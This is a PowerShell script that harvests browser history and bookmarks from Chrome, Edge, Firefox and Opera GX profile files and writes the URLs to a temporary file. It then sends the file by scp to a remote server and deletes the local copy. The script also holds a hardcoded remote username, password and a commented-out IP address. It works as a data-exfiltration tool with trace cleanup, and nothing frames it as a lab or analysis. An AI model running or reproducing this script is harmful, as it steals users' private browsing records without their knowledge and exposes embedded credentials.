function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )
    
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default/Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }
    
    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | ForEach-Object { ($_.Matches).Value } | Sort -Unique
    $Value | ForEach-Object {
        New-Object -TypeName PSObject -Property @{
            User = $env:UserName
            Browser = $Browser
            DataType = $DataType
            Data = $_
        }
    }
}

# Create a timestamped file
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$OutputFile = "$env:TEMP\BrowserData_$Timestamp.txt"

# Collect browser data and save to file
Get-BrowserData -Browser "chrome" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $OutputFile
Get-BrowserData -Browser "edge" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $OutputFile
Get-BrowserData -Browser "firefox" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "opera" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $OutputFile

# SCP the file to a remote server
$RemoteUser = "Benjak617"
# $RemoteServer = "174.51.68.96"
$RemoteServer = "BENJAK618"
$RemotePath = "/"
$Password = "Snowman1234!"

# Use SCP for file transfer
$SCPCommand = "scp.exe"
$Args = @("$OutputFile", "$RemoteUser@$RemoteServer:$RemotePath")

# Execute the SCP command
Start-Process -FilePath $SCPCommand -ArgumentList $Args -Wait

# Clean up
Remove-Item -Path $OutputFile
